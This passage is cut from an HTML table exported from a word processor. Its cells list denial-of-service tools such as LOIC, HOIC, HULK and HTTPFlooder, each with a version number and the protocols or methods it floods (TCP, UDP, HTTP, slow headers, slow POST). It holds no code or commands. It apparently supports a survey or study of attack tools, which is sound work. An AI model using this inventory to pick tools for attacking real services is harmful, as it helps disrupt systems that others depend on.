0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >5.5</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >TCP</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >FireFlood</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >1.2</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >HTTP</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Goodbye</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >3</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >HTTP</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Goodbye</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >5.2</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >HTTP</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >HOIC</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >2.1.003</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >HTTP</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >HULK</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >1.0</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >HTTP</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >HTTP DoS Tool</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >3.6</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >slow headers, slow POST</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >HTTPFlooder</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >0</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >HTTP</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:38.7500pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;margin-right:45.5500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Janidos -Weak edition</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >0</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >HTTP</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >JavaLOIC</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >0.0.3.7</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >TCP, UDP, HTTP</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >LOIC</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >1.1.1.25</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >TCP, UDP, HTTP</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:12.6000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:0.7500pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:9.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:9.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:9.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr></table></div>
